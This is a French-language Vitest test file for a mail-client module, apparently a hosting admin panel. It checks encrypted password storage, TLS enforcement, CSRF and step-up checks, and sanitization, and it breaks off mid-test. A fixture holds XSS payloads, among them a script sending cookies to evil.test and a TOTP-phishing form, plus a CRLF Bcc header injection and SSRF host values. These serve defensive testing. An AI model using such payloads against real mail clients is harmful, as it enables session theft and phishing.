import type { MailAccount, MailFolder, MailMessageDetail, MailMessageSummary, MailSendResult, MailUnreadSummary } from '@shared/api-types';
import type { FastifyInstance } from 'fastify';
import { simpleParser } from 'mailparser';
import MailComposer from 'nodemailer/lib/mail-composer';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { decrypt } from '../src/core/crypto.js';
import { db } from '../src/db/index.js';
import { outbox } from '../src/core/mailer.js';
import { accountAlertText } from '../src/modules/mail/index.js';
import { advance, alertMails, Browser, buildTestApp, createTestAdmin, uniqueIp, useFakeClock, type TestAdmin } from './helpers.js';

// ───────────────────────────── Faux serveurs IMAP / SMTP ─────────────────────────────

interface FakeMessage {
  uid: number;
  flags: Set<string>;
  envelope: Record<string, unknown>;
  bodyStructure: Record<string, unknown>;
  source: Buffer;
  parts: Record<string, Buffer>;
  headers?: string;
}
interface FakeServer {
  password: string;
  secure: boolean;
  connectError: unknown;
  folders: { path: string; name: string; specialUse?: string; flags?: string[] }[];
  boxes: Map<string, FakeMessage[]>;
  appended: { path: string; content: Buffer; flags: string[] }[];
}
interface FakeCall {
  host: string;
  user: string;
  op: string;
  args: unknown[];
}

const mock = vi.hoisted(() => {
  const servers = new Map<string, FakeServer>();
  const instances: { options: Record<string, any>; closed: boolean; loggedOut: boolean; locks: number; connected: boolean }[] = [];
  const calls: FakeCall[] = [];

  class FakeImapFlow {
    options: Record<string, any>;
    usable = false;
    secureConnection = false;
    mailbox: { path: string; exists: number } | false = false;
    closed = false;
    loggedOut = false;
    connected = false;
    locks = 0;
    private selected: string | null = null;
    private readOnly = false;

    constructor(options: Record<string, any>) {
      this.options = options;
      instances.push(this);
    }

    private get server(): FakeServer {
      const server = servers.get(this.options.host);
      if (!server) throw Object.assign(new Error(`getaddrinfo ENOTFOUND ${this.options.host}`), { code: 'ENOTFOUND' });
      return server;
    }
    private record(op: string, ...args: unknown[]): void {
      calls.push({ host: this.options.host, user: this.options.auth.user, op, args });
    }
    private box(): FakeMessage[] {
      if (!this.selected) throw new Error('aucune boîte sélectionnée');
      return this.server.boxes.get(this.selected)!;
    }
    private resolve(range: unknown, options?: { uid?: boolean }): { message: FakeMessage; seq: number }[] {
      const all = this.box().map((message, index) => ({ message, seq: index + 1 }));
      if (Array.isArray(range)) return all.filter((entry) => range.includes(entry.message.uid));
      if (typeof range === 'number') return all.filter((entry) => (options?.uid ? entry.message.uid === range : entry.seq === range));
      const [low, high] = String(range).split(':').map(Number);
      return all.filter((entry) => entry.seq >= low! && entry.seq <= (high ?? low!));
    }
    private project({ message, seq }: { message: FakeMessage; seq: number }, query: Record<string, any>): Record<string, unknown> {
      const out: Record<string, unknown> = { seq, uid: message.uid };
      if (query.flags) out.flags = new Set(message.flags);
      if (query.envelope) out.envelope = message.envelope;
      if (query.bodyStructure) out.bodyStructure = message.bodyStructure;
      if (query.internalDate) out.internalDate = new Date('2026-02-20T08:00:00Z');
      if (query.source) out.source = typeof query.source === 'object' ? message.source.subarray(0, query.source.maxLength) : message.source;
      if (query.headers) out.headers = Buffer.from(message.headers ?? '');
      if (query.bodyParts) {
        const parts = new Map<string, Buffer>();
        for (const part of query.bodyParts as (string | { key: string; start?: number; maxLength?: number })[]) {
          const key = typeof part === 'string' ? part : part.key;
          const content = message.parts[key];
          if (!content) continue;
          parts.set(key.toLowerCase(), typeof part === 'object' && part.maxLength ? content.subarray(part.start ?? 0, (part.start ?? 0) + part.maxLength) : content);
        }
        out.bodyParts = parts;
      }
      return out;
    }
    private assertWritable(): void {
      if (this.readOnly) throw new Error('boîte ouverte en lecture seule');
    }

    on(): this {
      return this;
    }
    async connect(): Promise<void> {
      this.record('connect');
      const server = this.server;
      if (server.connectError) throw server.connectError;
      if (this.options.auth.pass !== server.password) {
        throw Object.assign(new Error(`A1 NO [AUTHENTICATIONFAILED] LOGIN ${this.options.auth.user} ${this.options.auth.pass}`), { authenticationFailed: true });
      }
      this.connected = true;
      this.usable = true;
      this.secureConnection = server.secure;
    }
    async logout(): Promise<void> {
      this.loggedOut = true;
      this.usable = false;
    }
    close(): void {
      this.closed = true;
      this.usable = false;
    }
    async noop(): Promise<void> {
      this.record('noop');
    }
    async list(options?: { statusQuery?: unknown }): Promise<unknown[]> {
      this.record('list');
      return this.server.folders.map((folder) => {
        const box = this.server.boxes.get(folder.path) ?? [];
        return {
          path: folder.path,
          name: folder.name,
          delimiter: '/',
          specialUse: folder.specialUse,
          flags: new Set(folder.flags ?? []),
          status: options?.statusQuery ? { path: folder.path, messages: box.length, unseen: box.filter((m) => !m.flags.has('\\Seen')).length } : undefined,
        };
      });
    }
    async status(path: string): Promise<unknown> {
      this.record('status', path);
      const box = this.server.boxes.get(path);
      return box ? { path, unseen: box.filter((m) => !m.flags.has('\\Seen')).length } : false;
    }
    async getMailboxLock(path: string, options?: { readOnly?: boolean }): Promise<{ path: string; release: () => void }> {
      this.record('lock', path, options);
      const box = this.server.boxes.get(path);
      if (!box) throw Object.assign(new Error(`A2 NO Mailbox does not exist: ${path}`), { mailboxMissing: true });
      this.selected = path;
      this.readOnly = options?.readOnly === true;
      this.mailbox = { path, exists: box.length };
      this.locks += 1;
      return {
        path,
        release: () => {
          this.locks -= 1;
        },
      };
    }
    async search(query: { or: { subject?: string }[] }, options?: unknown): Promise<number[]> {
      this.record('search', query, options);
      const term = (query.or[0]!.subject ?? '').toLowerCase();
      return this.box()
        .filter((message) => String(message.envelope.subject ?? '').toLowerCase().includes(term))
        .map((message) => message.uid);
    }
    async fetchAll(range: unknown, query: Record<string, any>, options?: { uid?: boolean }): Promise<unknown[]> {
      this.record('fetchAll', range, query, options);
      return this.resolve(range, options).map((entry) => this.project(entry, query));
    }
    async fetchOne(range: unknown, query: Record<string, any>, options?: { uid?: boolean }): Promise<unknown> {
      this.record('fetchOne', range, query, options);
      const [entry] = this.resolve(range, options);
      return entry ? this.project(entry, query) : false;
    }
    async download(range: unknown, part: string, options?: { uid?: boolean }): Promise<unknown> {
      this.record('download', range, part, options);
      const [entry] = this.resolve(range, options);
      const content = entry?.message.parts[part];
      if (!content) return {};
      const { Readable } = await import('node:stream');
      return { meta: { contentType: 'text/html', filename: 'ignored.html' }, content: Readable.from([content.subarray(0, 5), content.subarray(5)]) };
    }
    async messageFlagsAdd(range: unknown, flags: string[], options?: { uid?: boolean }): Promise<boolean> {
      this.record('flagsAdd', range, flags, options);
      this.assertWritable();
      for (const { message } of this.resolve(range, options)) for (const flag of flags) message.flags.add(flag);
      return true;
    }
    async messageFlagsRemove(range: unknown, flags: string[], options?: { uid?: boolean }): Promise<boolean> {
      this.record('flagsRemove', range, flags, options);
      this.assertWritable();
      for (const { message } of this.resolve(range, options)) for (const flag of flags) message.flags.delete(flag);
      return true;
    }
    async messageMove(range: unknown, destination: string, options?: { uid?: boolean }): Promise<unknown> {
      this.record('move', range, destination, options);
      this.assertWritable();
      const target = this.server.boxes.get(destination);
      if (!target) return false;
      const box = this.box();
      for (const { message } of this.resolve(range, options)) {
        box.splice(box.indexOf(message), 1);
        target.push(message);
      }
      return { path: this.selected, destination };
    }
    async messageDelete(range: unknown, options?: { uid?: boolean }): Promise<boolean> {
      this.record('delete', range, options);
      this.assertWritable();
      const box = this.box();
      for (const { message } of this.resolve(range, options)) box.splice(box.indexOf(message), 1);
      return true;
    }
    async append(path: string, content: Buffer, flags: string[]): Promise<unknown> {
      this.record('append', path, flags);
      this.server.appended.push({ path, content: Buffer.from(content), flags });
      return { destination: path };
    }
  }

  const smtp = {
    transports: [] as { options: Record<string, any>; closed: boolean }[],
    sent: [] as { options: Record<string, any>; message: Record<string, any> }[],
    sendError: null as unknown,
    verifyError: null as unknown,
  };
  const createTransport = (options: Record<string, any>) => {
    const transport = {
      options,
      closed: false,
      async verify() {
        if (smtp.verifyError) throw smtp.verifyError;
        return true;
      },
      async sendMail(message: Record<string, any>) {
        if (smtp.sendError) throw smtp.sendError;
        smtp.sent.push({ options, message });
        return { messageId: message.messageId, accepted: message.envelope.to, rejected: [] };
      },
      close() {
        transport.closed = true;
      },
    };
    smtp.transports.push(transport);
    return transport;
  };

  const whmcs = { byEmail: new Map<string, unknown>(), calls: [] as string[], fail: false };

  return { servers, instances, calls, FakeImapFlow, smtp, createTransport, whmcs };
});

vi.mock('imapflow', () => ({ ImapFlow: mock.FakeImapFlow }));
vi.mock('nodemailer', async (importOriginal) => {
  const actual = await importOriginal<Record<string, unknown>>();
  return { ...actual, createTransport: mock.createTransport, default: { ...(actual.default as object), createTransport: mock.createTransport } };
});
vi.mock('../src/modules/whmcs/service.js', () => ({
  isWhmcsConfigured: () => true,
  findClientByEmail: async (email: string) => {
    mock.whmcs.calls.push(email);
    if (mock.whmcs.fail) throw new Error('WHMCS en panne');
    return mock.whmcs.byEmail.get(email.toLowerCase()) ?? null;
  },
  findClientsByEmails: async () => new Map(),
}));

// ───────────────────────────── Jeux de données ─────────────────────────────

const CRLF = String.fromCharCode(13, 10);
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from('image-de-test')]);
const PDF = Buffer.from('%PDF-1.4 contenu de la facture');

const HOSTILE_HTML = [
  '<html><head><title>T</title><style>p{background:url(https://tracker.test/css)}</style><base href="https://evil.test/"></head><body>',
  '<p onclick="steal()" style="color:red;position:fixed">Bonjour</p>',
  '<script>fetch("https://evil.test/?c="+document.cookie)</script>',
  '<img src="https://tracker.test/pixel.gif?id=42" alt="pixel">',
  '<img src="cid:logo@client" alt="Logo">',
  '<a href="javascript:alert(document.domain)">piège</a> <a href="https://exemple.test/facture">facture</a>',
  '<iframe src="https://evil.test"></iframe><form action="https://evil.test"><input name="totp"></form>',
  '<svg onload="alert(1)"></svg>',
  '</body></html>',
].join('');

async function buildSource(options: ConstructorParameters<typeof MailComposer>[0]): Promise<Buffer> {
  return new MailComposer(options).compile().build();
}

async function invoiceMessage(uid: number): Promise<FakeMessage> {
  const source = await buildSource({
    from: 'Client Martin <client@exemple.test>',
    to: 'support@exemple.test',
    cc: 'compta@exemple.test',
    replyTo: 'reponse@exemple.test',
    subject: 'Facture en attente',
    messageId: '<orig-1@client.test>',
    date: new Date('2026-02-20T07:59:00Z'),
    text: 'Bonjour, version texte.',
    html: HOSTILE_HTML,
    attachments: [
      { filename: 'logo.png', content: PNG, cid: 'logo@client', contentType: 'image/png' },
      { filename: 'facture.pdf', content: PDF, contentType: 'application/pdf' },
    ],
  });
  return {
    uid,
    flags: new Set(),
    source,
    headers: `References: <r1@client.test>${CRLF} <r2@client.test>${CRLF}${CRLF}`,
    envelope: {
      date: new Date('2026-02-20T07:59:00Z'),
      subject: `Facture en attente${CRLF}Bcc: intrus@evil.test`,
      messageId: '<orig-1@client.test>',
      from: [{ name: 'Client Martin', address: 'client@exemple.test' }],
      to: [{ name: '', address: 'support@exemple.test' }],
      cc: [{ name: '', address: 'compta@exemple.test' }],
      replyTo: [{ name: '', address: 'reponse@exemple.test' }],
    },
    bodyStructure: {
      type: 'multipart/mixed',
      childNodes: [
        {
          part: '1',
          type: 'multipart/alternative',
          childNodes: [
            { part: '1.1', type: 'text/plain', encoding: '7bit', size: 23, parameters: { charset: 'utf-8' } },
            {
              part: '1.2',
              type: 'multipart/related',
              childNodes: [
                { part: '1.2.1', type: 'text/html', encoding: 'quoted-printable', size: 900, parameters: { charset: 'utf-8' } },
                { part: '1.2.2', type: 'image/png', id: '<logo@client>', encoding: 'base64', size: 40, disposition: 'inline', dispositionParameters: { filename: 'logo.png' } },
              ],
            },
          ],
        },
        { part: '2', type: 'application/pdf', encoding: 'base64', size: 40, disposition: 'attachment', dispositionParameters: { filename: '../../facture "été".pdf' } },
      ],
    },
    parts: { '1.1': Buffer.from('Bonjour, version texte.'), '1.2.2': PNG, '2': PDF },
  };
}

async function plainMessage(uid: number, subject: string, from: string, text: string, flags: string[] = []): Promise<FakeMessage> {
  return {
    uid,
    flags: new Set(flags),
    source: await buildSource({ from, to: 'support@exemple.test', subject, text, messageId: `<m${uid}@exemple.test>` }),
    envelope: { date: new Date('2026-02-19T10:00:00Z'), subject, messageId: `<m${uid}@exemple.test>`, from: [{ name: '', address: from }], to: [{ name: '', address: 'support@exemple.test' }] },
    bodyStructure: { type: 'text/plain', encoding: '7bit', size: text.length, parameters: { charset: 'utf-8' } },
    parts: { '1': Buffer.from(text) },
  };
}

async function supportServer(): Promise<FakeServer> {
  return {
    password: 'mdp-Support-Tres-Secret-1',
    secure: true,
    connectError: null,
    folders: [
      { path: 'INBOX', name: 'INBOX' },
      { path: 'Envoyés', name: 'Envoyés', specialUse: '\\Sent' },
      { path: 'Corbeille', name: 'Corbeille', specialUse: '\\Trash' },
      { path: 'Brouillons', name: 'Brouillons', specialUse: '\\Drafts' },
      { path: 'Indésirables', name: 'Indésirables', specialUse: '\\Junk' },
      { path: 'Clients', name: 'Clients' },
      { path: '[Conteneur]', name: '[Conteneur]', flags: ['\\Noselect'] },
      { path: 'Tous', name: 'Tous', specialUse: '\\All' },
    ],
    boxes: new Map([
      [
        'INBOX',
        [
          await plainMessage(10, 'Ancien message', 'vieux@exemple.test', 'Un message déjà lu.', ['\\Seen']),
          await invoiceMessage(11),
          await plainMessage(12, 'Question hébergement', 'prospect@exemple.test', 'Bonjour, proposez-vous des serveurs dédiés ?'),
        ],
      ],
      ['Envoyés', []],
      ['Corbeille', []],
      ['Brouillons', []],
      ['Indésirables', []],
      ['Clients', []],
      ['Tous', []],
    ]),
    appended: [],
  };
}

async function billingServer(): Promise<FakeServer> {
  return {
    password: 'mdp-Facturation-Autre-2',
    secure: true,
    connectError: null,
    folders: [{ path: 'INBOX', name: 'INBOX' }],
    boxes: new Map([['INBOX', [await plainMessage(501, 'Relevé bancaire confidentiel', 'banque@exemple.test', 'Solde du compte.')]]]),
    appended: [],
  };
}

const supportInput = {
  label: 'Support',
  address: 'support@exemple.test',
  imapHost: 'imap.support.test',
  imapPort: 993,
  imapSecure: true,
  smtpHost: 'smtp.support.test',
  smtpPort: 587,
  smtpSecure: false,
  username: 'support-login',
  password: 'mdp-Support-Tres-Secret-1',
};
const billingInput = {
  label: 'Facturation',
  address: 'facturation@exemple.test',
  imapHost: 'imap.billing.test',
  imapPort: 143,
  imapSecure: false,
  smtpHost: 'smtp.billing.test',
  smtpPort: 465,
  smtpSecure: true,
  username: 'billing-login',
  password: 'mdp-Facturation-Autre-2',
};

interface AuditRow {
  action: string;
  target: string | null;
  success: number;
  details: string | null;
  user_id: number | null;
}
const mailAudit = (): AuditRow[] => db.prepare("SELECT action, target, success, details, user_id FROM audit_log WHERE action LIKE 'mail.%' ORDER BY id").all() as AuditRow[];
const lastAudit = (action: string): AuditRow => {
  const row = mailAudit()
    .filter((entry) => entry.action === action)
    .at(-1);
  if (!row) throw new Error(`aucune entrée d'audit ${action}`);
  return row;
};
const passwordEnc = (id: number): string => (db.prepare('SELECT password_enc FROM mail_accounts WHERE id = ?').get(id) as { password_enc: string }).password_enc;
const opsOf = (op: string): FakeCall[] => mock.calls.filter((call) => call.op === op);
const assertNoLeak = (): void => {
  for (const instance of mock.instances) {
    expect(instance.closed, 'connexion IMAP non fermée').toBe(true);
    expect(instance.locks, 'verrou de boîte non libéré').toBe(0);
  }
  for (const transport of mock.smtp.transports) expect(transport.closed, 'transport SMTP non fermé').toBe(true);
};

let app: FastifyInstance;
let alice: TestAdmin;
let bob: TestAdmin;
let browser: Browser;
let supportId: number;
let billingId: number;

async function stepUp(target: Browser = browser, admin: TestAdmin = alice): Promise<void> {
  const res = await target.stepUp(admin);
  if (res.status !== 200) throw new Error(`step-up refusé : ${res.status}`);
}

beforeAll(async () => {
  useFakeClock();
  app = await buildTestApp();
  alice = await createTestAdmin('alice');
  bob = await createTestAdmin('bob');
  browser = new Browser(app, uniqueIp());
  await browser.login(alice);
});

beforeEach(async () => {
  // Nouvelle minute : les compteurs de débit de l'authentification repartent de zéro, le cache des non-lus expire.
  advance(61_000);
  mock.servers.clear();
  mock.servers.set('imap.support.test', await supportServer());
  mock.servers.set('imap.billing.test', await billingServer());
  mock.instances.length = 0;
  mock.calls.length = 0;
  mock.smtp.transports.length = 0;
  mock.smtp.sent.length = 0;
  mock.smtp.sendError = null;
  mock.smtp.verifyError = null;
  mock.whmcs.byEmail.clear();
  mock.whmcs.calls.length = 0;
  mock.whmcs.fail = false;
});

afterAll(async () => {
  await app.close();
});

// ───────────────────────────── Comptes ─────────────────────────────

describe('comptes de messagerie', () => {
  it('toutes les routes exigent une session', async () => {
    const anonymous = new Browser(app, uniqueIp());
    for (const url of ['/api/mail/accounts', '/api/mail/unread-summary', '/api/mail/accounts/1/folders', '/api/mail/accounts/1/messages', '/api/mail/accounts/1/messages/1', '/api/mail/accounts/1/messages/1/attachments/2']) {
      const res = await anonymous.get(url);
      expect(res.status, url).toBe(401);
      expect(res.errorCode).toBe('UNAUTHENTICATED');
    }
    expect((await anonymous.post('/api/mail/accounts/1/send', { to: ['a@exemple.test'], subject: 's', text: 't' })).status).toBe(401);
    expect(mock.instances).toHaveLength(0);
  });

  it('les écritures exigent un jeton CSRF', async () => {
    const res = await browser.post('/api/mail/accounts/1/messages/1/flags', { seen: true }, { csrf: null });
    expect(res.status).toBe(403);
    expect(res.errorCode).toBe('CSRF_INVALID');
    const foreign = await browser.post('/api/mail/accounts/1/send', { to: ['a@exemple.test'], subject: 's', text: 't' }, { origin: 'https://evil.test' });
    expect(foreign.errorCode).toBe('CSRF_INVALID');
    expect(mock.instances).toHaveLength(0);
  });

  it('créer, modifier et supprimer un compte exige un step-up', async () => {
    const fresh = new Browser(app, uniqueIp());
    await fresh.login(bob);
    // Une connexion ouvre une fenêtre de step-up : on la laisse expirer.
    advance(5 * 60_000 + 1_000);
    const created = await fresh.post('/api/mail/accounts', supportInput);
    expect(created.status).toBe(403);
    expect(created.errorCode).toBe('STEP_UP_REQUIRED');
    expect((await fresh.put('/api/mail/accounts/1', supportInput)).errorCode).toBe('STEP_UP_REQUIRED');
    expect((await fresh.delete('/api/mail/accounts/1')).errorCode).toBe('STEP_UP_REQUIRED');
    expect(db.prepare('SELECT COUNT(*) AS n FROM mail_accounts').get()).toEqual({ n: 0 });
    // La lecture, elle, ne demande pas de step-up.
    expect((await fresh.get('/api/mail/accounts')).status).toBe(200);
  });

  it('crée les comptes : mot de passe chiffré en base, jamais renvoyé', async () => {
    await stepUp();
    const support = await browser.post<MailAccount>('/api/mail/accounts', supportInput);
    expect(support.status).toBe(201);
    // Les listes sont triées par date de création (les identifiants sont aléatoires).
    advance(1_000);
    const billing = await browser.post<MailAccount>('/api/mail/accounts', billingInput);
    expect(billing.status).toBe(201);
    supportId = support.body.data.id;
    billingId = billing.body.data.id;

    expect(support.body.data).toEqual({
      id: supportId,
      label: 'Support',
      address: 'support@exemple.test',
      imapHost: 'imap.support.test',
      imapPort: 993,
      imapSecure: true,
      smtpHost: 'smtp.support.test',
      smtpPort: 587,
      smtpSecure: false,
      username: 'support-login',
      hasPassword: true,
      createdAt: new Date(Date.now() - 1_000).toISOString(),
      visibility: 'shared',
      ownedByMe: false,
    });

    const list = await browser.get<MailAccount[]>('/api/mail/accounts');
    expect(list.body.data.map((account) => account.id)).toEqual([supportId, billingId]);
    for (const raw of [JSON.stringify(support.body), JSON.stringify(billing.body), JSON.stringify(list.body)]) {
      expect(raw).not.toContain(supportInput.password);
      expect(raw).not.toContain(billingInput.password);
      expect(raw).not.toMatch(/password"|passwordEnc|password_enc|v1:/);
    }

    // En base : chiffré (AES-GCM), illisible, lié à CE compte.
    const enc = passwordEnc(supportId);
    expect(enc).toMatch(/^v1:[\w-]+:[\w-]+:[\w-]+$/);
    expect(enc).not.toContain(supportInput.password);
    expect(Buffer.from(enc.split(':')[3]!, 'base64url').toString('latin1')).not.toContain(supportInput.password);
    const dump = JSON.stringify(db.prepare('SELECT * FROM mail_accounts').all());
    expect(dump).not.toContain(supportInput.password);
    expect(dump).not.toContain(billingInput.password);
    expect(decrypt(enc, `mail_accounts:${supportId}:password`)).toBe(supportInput.password);
    // Un chiffré recopié sur un autre compte (ou lu sans contexte) est indéchiffrable.
    expect(() => decrypt(enc, `mail_accounts:${billingId}:password`)).toThrow();
    expect(() => decrypt(enc)).toThrow();

    const entry = lastAudit('mail.account.create');
    expect(entry).toMatchObject({ success: 1, target: `compte mail #${billingId} (Facturation)`, user_id: alice.user.id });
    expect(JSON.stringify(mailAudit())).not.toContain(supportInput.password);
    expect(JSON.stringify(mailAudit())).not.toContain(billingInput.password);
  });

  it('refuse les hôtes, ports et champs invalides', async () => {
    await stepUp();
    const cases: Record<string, unknown>[] = [
      { imapHost: 'http://imap.support.test' },
      { imapHost: '169.254.169.254' },
      { smtpHost: 'smtp.support.test/../x' },
      { smtpHost: '2852039166' },
      { imapPort: 22 },
      { smtpPort: 80 },
      { address: 'pas-une-adresse' },
      { password: '' },
      { id: 999 },
      { passwordEnc: 'v1:a:b:c' },
    ];
    for (const patch of cases) {
      const res = await browser.post('/api/mail/accounts', { ...supportInput, ...patch });
      expect(res.status, JSON.stringify(patch)).toBe(400);
      expect(res.errorCode).toBe('VALIDATION_ERROR');
      expect(JSON.stringify(res.body)).not.toContain(supportInput.password);
    }
    expect(db.prepare('SELECT COUNT(*) AS n FROM mail_accounts').get()).toEqual({ n: 2 });
  });

  it('en modification, un mot de passe absent ou vide reste inchangé', async () => {
    await stepUp();
    const before = passwordEnc(supportId);
    const { password: _password, ...withoutPassword } = supportInput;

    const renamed = await browser.put<MailAccount>(`/api/mail/accounts/${supportId}`, { ...withoutPassword, label: 'Support client' });
    expect(renamed.status).toBe(200);
    expect(renamed.body.data.label).toBe('Support client');
    expect(passwordEnc(supportId)).toBe(before);

    const empty = await browser.put<MailAccount>(`/api/mail/accounts/${supportId}`, { ...withoutPassword, password: '' });
    expect(empty.status).toBe(200);
    expect(empty.body.data.label).toBe('Support');
    expect(passwordEnc(supportId)).toBe(before);
    expect(JSON.parse(lastAudit('mail.account.update').details!)).toMatchObject({ passwordChanged: false });

    const changed = await browser.put<MailAccount>(`/api/mail/accounts/${supportId}`, { ...withoutPassword, password: 'un-nouveau-mot-de-passe' });
    expect(changed.status).toBe(200);
    expect(passwordEnc(supportId)).not.toBe(before);
    expect(decrypt(passwordEnc(supportId), `mail_accounts:${supportId}:password`)).toBe('un-nouveau-mot-de-passe');
    expect(JSON.stringify(changed.body)).not.toContain('un-nouveau-mot-de-passe');
    expect(JSON.parse(lastAudit('mail.account.update').details!)).toMatchObject({ passwordChanged: true });
    expect(JSON.stringify(mailAudit())).not.toContain('un-nouveau-mot-de-passe');

    // Remise en état pour la suite.
    expect((await browser.put(`/api/mail/accounts/${supportId}`, supportInput)).status).toBe(200);
    expect((await browser.put('/api/mail/accounts/99999', supportInput)).status).toBe(404);
  });

  it('changer de serveur sans ressaisir le mot de passe est refusé (pas d’exfiltration vers un autre hôte)', async () => {
    await stepUp();
    const before = passwordEnc(supportId);
    const { password: _password, ...withoutPassword } = supportInput;
    for (const patch of [{ imapHost: 'imap.attaquant.test' }, { smtpHost: 'smtp.attaquant.test' }]) {
      const res = await browser.put(`/api/mail/accounts/${supportId}`, { ...withoutPassword, ...patch });
      expect(res.status).toBe(400);
      expect(lastAudit('mail.account.update').success).toBe(0);
    }
    const row = db.prepare('SELECT imap_host, smtp_host FROM mail_accounts WHERE id = ?').get(supportId);
    expect(row).toEqual({ imap_host: 'imap.support.test', smtp_host: 'smtp.support.test' });
    expect(passwordEnc(supportId)).toBe(before);
    expect(mock.instances).toHaveLength(0);
  });

  it('teste un compte : TLS exigé sur IMAP et SMTP, certificats vérifiés', async () => {
    const ok = await browser.post<{ ok: boolean; message: string }>(`/api/mail/accounts/${billingId}/test`);
    expect(ok.status).toBe(200);
    expect(ok.body.data).toMatchObject({ ok: true, message: 'Connexions IMAP et SMTP réussies' });

    // Compte « Facturation » : IMAP sans TLS implicite → STARTTLS obligatoire ; SMTP en TLS implicite.
    const imap = mock.instances[0]!.options;
    expect(imap).toMatchObject({ host: 'imap.billing.test', port: 143, secure: false, doSTARTTLS: true, logger: false });
    expect(imap.tls).toEqual({ rejectUnauthorized: true, minVersion: 'TLSv1.2' });
    expect(imap.auth).toEqual({ user: 'billing-login', pass: billingInput.password });
    const smtp = mock.smtp.transports[0]!.options;
    expect(smtp).toMatchObject({ host: 'smtp.billing.test', port: 465, secure: true });
    expect(smtp.tls).toEqual({ rejectUnauthorized: true, minVersion: 'TLSv1.2' });

    // Compte « Support » : SMTP sans TLS implicite → requireTLS.
    await browser.post(`/api/mail/accounts/${supportId}/test`);
    expect(mock.instances[1]!.options).toMatchObject({ host: 'imap.support.test', secure: true });
    expect(mock.smtp.transports[1]!.options).toMatchObject({ host: 'smtp.support.test', secure: false, requireTLS: true, ignoreTLS: false });
    assertNoLeak();
  });

  it('le test renvoie un message sobre : ni réponse du serveur, ni identifiants', async () => {
    const server = mock.servers.get('imap.support.test')!;
    server.connectError = Object.assign(new Error(`A1 NO [AUTHENTICATIONFAILED] LOGIN support-login ${supportInput.password} rejected by imap.support.test`), {
      authenticationFailed: true,
      responseText: `Invalid credentials ${supportInput.password}`,
    });
    mock.smtp.verifyError = Object.assign(new Error(`535 5.7.8 Error: authentication failed: ${supportInput.password}`), { code: 'EAUTH', response: `535 ${supportInput.password}` });

    const res = await browser.post<{ ok: boolean; message: string }>(`/api/mail/accounts/${supportId}/test`);
    expect(res.status).toBe(200);
    expect(res.body.data.ok).toBe(false);
    expect(res.body.data.message).toBe('IMAP : Authentification refusée par le serveur de messagerie · SMTP : Authentification refusée par le serveur de messagerie');
    const raw = JSON.stringify(res.body);
    expect(raw).not.toContain(supportInput.password);
    expect(raw).not.toMatch(/support-login|imap\.support\.test|AUTHENTICATIONFAILED|535|LOGIN/);
    expect(JSON.stringify(mailAudit())).not.toContain(supportInput.password);
    assertNoLeak();
  });

  it('une connexion IMAP restée en clair est refusée avant toute commande', async () => {
    mock.servers.get('imap.support.test')!.secure = false;
    const res = await browser.get(`/api/mail/accounts/${supportId}/folders`);
    expect(res.status).toBe(502);
    expect(res.body.error?.details).toEqual({ integration: 'mail', reason: 'tls' });
    expect(mock.calls.map((call) => call.op)).toEqual(['connect']);
    assertNoLeak();
  });
});

// ───────────────────────────── Lecture ─────────────────────────────

describe('lecture', () => {
  it('liste les dossiers avec usage normalisé et compteurs', async () => {
    const res = await browser.get<MailFolder[]>(`/api/mail/accounts/${supportId}/folders`);
    expect(res.status).toBe(200);
    expect(res.body.data).toEqual([
      { path: 'INBOX', name: 'INBOX', specialUse: 'inbox', unread: 2, total: 3 },
      { path: 'Brouillons', name: 'Brouillons', specialUse: 'drafts', unread: 0, total: 0 },
      { path: 'Envoyés', name: 'Envoyés', specialUse: 'sent', unread: 0, total: 0 },
      { path: 'Indésirables', name: 'Indésirables', specialUse: 'junk', unread: 0, total: 0 },
      { path: 'Corbeille', name: 'Corbeille', specialUse: 'trash', unread: 0, total: 0 },
      { path: 'Clients', name: 'Clients', specialUse: null, unread: 0, total: 0 },
      { path: 'Tous', name: 'Tous', specialUse: null, unread: 0, total: 0 },
    ]);
    assertNoLeak();
  });

  it('liste les messages du plus récent au plus ancien, sans télécharger les corps', async () => {
    const res = await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${supportId}/messages`);
    expect(res.status).toBe(200);
    expect(res.body.meta).toEqual({ page: 1, pageSize: 25, total: 3 });
    expect(res.body.data.map((message) => message.uid)).toEqual([12, 11, 10]);
    expect(res.body.data[0]).toEqual({
      uid: 12,
      folder: 'INBOX',
      from: { name: null, address: 'prospect@exemple.test' },
      to: [{ name: null, address: 'support@exemple.test' }],
      subject: 'Question hébergement',
      date: '2026-02-19T10:00:00.000Z',
      seen: false,
      flagged: false,
      answered: false,
      hasAttachments: false,
      preview: 'Bonjour, proposez-vous des serveurs dédiés ?',
    });
    // L'objet hostile (retour à la ligne) est aplati ; l'image intégrée n'est pas comptée comme pièce jointe.
    expect(res.body.data[1]).toMatchObject({ uid: 11, subject: 'Facture en attente Bcc: intrus@evil.test', hasAttachments: true, seen: false, preview: 'Bonjour, version texte.' });
    expect(res.body.data[2]).toMatchObject({ uid: 10, seen: true });

    // Boîte ouverte en lecture seule ; jamais la source complète ; aperçus = fragments bornés.
    expect(opsOf('lock').map((call) => call.args)).toEqual([['INBOX', { readOnly: true, acquireTimeout: 10_000 }]]);
    for (const call of opsOf('fetchAll')) {
      const query = call.args[1] as { source?: unknown; bodyParts?: { maxLength?: number }[] };
      expect(query.source).toBeUndefined();
      for (const part of query.bodyParts ?? []) expect(part.maxLength).toBeLessThanOrEqual(4096);
    }
    expect(opsOf('fetchOne')).toHaveLength(0);
    expect(opsOf('flagsAdd')).toHaveLength(0);
    assertNoLeak();
  });

  it('pagine par numéro de séquence', async () => {
    const first = await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${supportId}/messages?page=1&pageSize=2`);
    expect(first.body.data.map((message) => message.uid)).toEqual([12, 11]);
    expect(opsOf('fetchAll')[0]!.args[0]).toBe('2:3');
    const second = await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${supportId}/messages?page=2&pageSize=2`);
    expect(second.body.data.map((message) => message.uid)).toEqual([10]);
    expect(second.body.meta).toEqual({ page: 2, pageSize: 2, total: 3 });
    const beyond = await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${supportId}/messages?page=9&pageSize=2`);
    expect(beyond.body.data).toEqual([]);
    expect((await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${supportId}/messages?folder=Clients`)).body).toEqual({ data: [], meta: { page: 1, pageSize: 25, total: 0 } });
  });

  it('recherche côté IMAP (objet, expéditeur, corps) avec une chaîne bornée', async () => {
